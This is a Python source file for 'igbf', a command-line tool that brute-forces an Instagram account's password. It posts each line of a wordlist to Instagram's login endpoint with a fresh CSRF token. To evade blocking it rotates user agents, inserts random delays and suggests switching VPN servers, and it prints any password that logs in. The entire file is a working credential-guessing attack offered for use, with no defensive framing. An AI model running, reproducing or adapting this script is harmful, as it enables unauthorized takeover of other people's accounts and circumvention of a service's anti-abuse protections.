#!/usr/bin/python3
# igbf: Instagram Brute Force

import requests
import sys
import argparse
import datetime
import json
import random
import time
import socket
import os


def get_user_agent():
    user_agent_list = '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9
Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.227.0 Safari/532.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.224.2 Safari/532.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.7 Safari/532.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13
Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13
Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5
Mozilla/5.0 (Macintosh; U; Mac OS X 10_5_7; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/ Safari/530.6
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5'''

    # get random line from user agent list
    return random.choice(user_agent_list.splitlines())
    
def get_csrf_token():
    session = requests.Session()
    
    header = {
        'Accept-Language': 'en-US,en;q=0.5',
	    'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Host': 'www.instagram.com',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/',
	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0',
        'X-Instagram-AJAX': '1',
        'X-Requested-With': 'XMLHttpRequest'
    }

    cookies = {
        'sessionid': '',
        'mid': '',
        'ig_pr': '1',
        'ig_vw': '1920',
        'csrftoken': '',
        's_network': '',
        'ds_user_id': ''
    }

    session.headers.update(header)
    session.cookies.update(cookies)

    content = session.get('https://www.instagram.com/')

    return content.cookies['csrftoken']

def get_public_ip():
    return requests.get('https://api.ipify.org').text

def get_local_ip():
    return socket.gethostbyname(socket.gethostname())

def printit(text, center='', line_up=False, line_down=False, space_up=False, space_down=False, coledt=[0, 0, 0], normaltxt_start='', normaltxt_end=''):
    # get terminal width
    width = os.get_terminal_size().columns

    # printing text
    if space_up: print()
    if line_up: print('⸺'*width)

    print(normaltxt_start, end='')

    if len(text) < width:
        new_width = int((width - len(text))/2)
        print(center*new_width, end='')
        print(f'\33[{coledt[0]};{coledt[1]};{coledt[2]}m'+text+'\033[0m', end='')
        print(center*new_width)

    # print(normaltxt_end, end='')

    if line_down: print('⸺'*width)
    if space_down: print()

def main():
    # Taking command line arguments using argparse
    parser = argparse.ArgumentParser(description='(s41r4j:igbf)> Instagram Brute Force')
    parser.add_argument('-u', '--username', help='instagram username')
    parser.add_argument('-w', '--wordlist', help='password wordlist')
    args = parser.parse_args()

    # Assigning the arguments to variables
    username = args.username
    wordlist = args.wordlist

    # Checking if the arguments have been passed
    if username is None or wordlist is None:
        parser.print_help()
        sys.exit()

    # Displaying the information
    printit('[ Instagram Brute Force (igbf) ]', center=' ', line_up=True, line_down=True, coledt=[7, 49, 97])
    printit('[ https://github.com/s41r4j/igbf ]', center=' ', coledt=[7, 49, 92])
    printit(get_public_ip(), line_up=True, coledt=[1, 49, 96], normaltxt_start='[+] Public IP: ')
    printit(get_local_ip(), line_down=True, coledt=[1, 49, 96], normaltxt_start='[+] Local IP: ')
    printit(username, coledt=[1, 49, 96], normaltxt_start='[+] Username: ')
    printit(wordlist, coledt=[1, 49, 96], normaltxt_start='[+] Wordlist: ')

    # Opening the wordlist
    try:
        wordlist = open(wordlist, 'r')
    except FileNotFoundError:
        printit('[!] Wordlist not found')
        sys.exit()

    # Reading the wordlist
    wordlist = wordlist.readlines()

    # Line count of the wordlist
    wordlist_len = len(wordlist)
    printit(str(wordlist_len), line_down=True, space_down=True, coledt=[1, 49, 96], normaltxt_start='[+] Wordlist length: ')

    # Starting the brute force
    printit('[#] Starting the brute force...\n', coledt=[1, 49, 91])

    for password in wordlist:
        # Adding a random delay to avoid getting blocked
        time.sleep(2 * random.random())

        # Request data
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        login_time = int(datetime.datetime.now().timestamp())
        password = password.strip()
        user_agent = get_user_agent()
        csrf_token = get_csrf_token()

        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{login_time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        login_header = {
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf_token,
        }

        # Sending the request
        login_response = requests.post(login_url, data=payload, headers=login_header)

        if login_response.status_code == 403 or login_response.status_code == "403":
            printit("\n["+str(login_response.status_code)+"]: Temporary IP BLOCKED, wait for few minutes (temp-ip-block)", coledt=[4, 49, 91])
            printit("["+str(login_response.status_code)+"]: You can also use VPN/change active vpn server to continue (temp-ip-block)", coledt=[4, 49, 91])
            printit("["+str(login_response.status_code)+"]: Check if the USERNAME entered is correct (user-not-found)", coledt=[4, 49, 91])
            sys.exit()

        json_data = json.loads(login_response.text)
        
        try:
            if json_data["user"] == False:
                print(username, normaltxt_start="\n["+str(login_response.status_code)+"] Username not found:", coledt=[4, 49, 91])
                sys.exit()
        except SystemExit:
            sys.exit()
        except:
            pass
        
        # Checking if the password is correct
        try:
            if json_data["message"] == "checkpoint_required":
                printit(password, coledt=[7, 49, 97], normaltxt_start="\n["+str(login_response.status_code)+"] Login successful (pwd)> ")
                print("\n[+] User-agent used: "+user_agent)
                print("[+] CSRF token: ", csrf_token)
                print("\n[+] Checkpoint required")
                print("[+] Checkpoint url: https://www.instagram.com"+json_data["checkpoint_url"])
                sys.exit()
        except SystemExit:
            sys.exit()
        except KeyError:
            try:
                if json_data["authenticated"] == True:
                    printit(password, coledt=[7, 49, 97], normaltxt_start="\n["+str(login_response.status_code)+"] Login successful (pwd)> ")
                    sys.exit()
                else:
                    printit("["+str(login_response.status_code)+"] Login failed (incorrect pwd)", coledt=[1, 49, 93])
            except SystemExit:
                sys.exit()
            except:
                printit("["+str(login_response.status_code)+"] Login failed (incorrect pwd)", coledt=[1, 49, 93])
        except:
            printit("["+str(login_response.status_code)+"] Login failed (incorrect pwd)", coledt=[1, 49, 93])



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] Exiting...')
        sys.exit()
    except requests.exceptions.ConnectionError:
        print("\n[!] Internet connection is required!\n[!] Exiting...")
        sys.exit()